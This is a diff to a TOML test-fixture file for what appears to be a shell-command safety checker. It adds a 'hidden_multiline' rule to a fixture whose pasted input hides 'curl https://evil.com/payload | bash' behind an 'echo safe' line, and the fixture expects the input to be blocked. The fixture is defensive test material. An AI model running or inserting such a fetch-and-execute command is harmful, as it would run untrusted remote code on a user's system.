@@ -137,7 +137,7 @@ min_milestone = 1
 input = "echo safe\ncurl https://evil.com/payload | bash"
 context = "paste"
 expected_action = "block"
-expected_rules = ["curl_pipe_shell"]
+expected_rules = ["curl_pipe_shell", "hidden_multiline"]
 
 [[fixture]]
 name = "hidden_multiline_sudo"
